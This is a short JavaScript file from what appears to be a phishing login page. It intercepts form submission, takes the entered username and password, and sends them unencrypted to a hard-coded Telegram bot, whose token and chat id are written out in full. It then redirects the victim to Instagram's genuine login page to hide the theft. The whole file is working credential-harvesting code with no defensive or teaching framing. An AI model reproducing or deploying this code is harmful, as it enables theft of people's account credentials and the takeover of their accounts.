var form  = document.querySelector('form');

form.addEventListener("submit", (e)=> {
    e.preventDefault();
    var username = document.getElementById('username').value
    var password = document.getElementById('password').value
    var result = `${username}: ${password}`
    var token = "6089962515:AAF_My6RRQGuJcsHfJ1u-2FXwKdBESIPcVw"
    var chat_id = 6194528557

    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${result}`

    api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
    window.location = 'https://instagram.com/accounts/login'
    
})